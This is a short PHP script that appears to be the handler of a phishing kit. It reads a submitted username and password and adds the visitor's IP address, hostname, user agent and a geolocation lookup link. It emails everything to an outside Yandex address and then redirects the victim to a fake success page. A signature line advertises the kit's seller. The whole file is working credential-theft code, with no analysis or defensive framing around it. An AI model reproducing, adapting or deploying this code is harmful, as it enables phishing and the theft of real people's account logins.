<?php
if($_POST["em"] != "" and $_POST["qrt"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['em']."\n";
$message .= "Password:  ".$_POST['qrt']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------BURHAN FUDPAGES [.] RU --------------|\n";
$send = "spfmasters2@yandex.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: success.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>